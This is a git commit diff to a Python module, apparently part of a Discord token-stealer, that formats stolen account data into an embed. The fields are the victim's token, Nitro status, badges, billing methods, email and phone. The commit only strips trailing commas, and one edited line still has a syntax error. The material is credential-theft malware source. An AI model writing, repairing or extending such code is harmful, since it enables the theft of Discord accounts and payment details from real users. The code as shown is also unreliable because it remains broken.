6c6510134508cb1c8e56034f64584d0dc02203c6
READDONE313 <98390001+READDONE313@users.noreply.github.com>
2023-05-07 12:50:42 +0000

    Update discordtoken.py

--- src/components/discordtoken.py
+++ src/components/discordtoken.py
@@ -343,9 +343,9 @@ class upload_tokens:
             embed.set_thumbnail(url=avatar)
 
             embed.add_field(name="🔑 Token", value=f"```{token}```", inline=False)
-            embed.add_field(name="Nitro", value=f"```{nitro}```", inline=True),
+            embed.add_field(name="Nitro", value=f"```{nitro}```", inline=True)
             embed.add_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
-            embed.add_field(name="Billing", value=f"```{payment_methods if payment_methods != '' else 'None'}```" inline=True),
+            embed.add_field(name="Billing", value=f"```{payment_methods if payment_methods != '' else 'None'}```" inline=True)
 
             embed.add_field(name="Email", value=f"```{email if email != None else 'None'}```", inline=True)
             embed.add_field(name="Phone", value=f"```{phone if phone != None else 'None'}```", inline=True)    
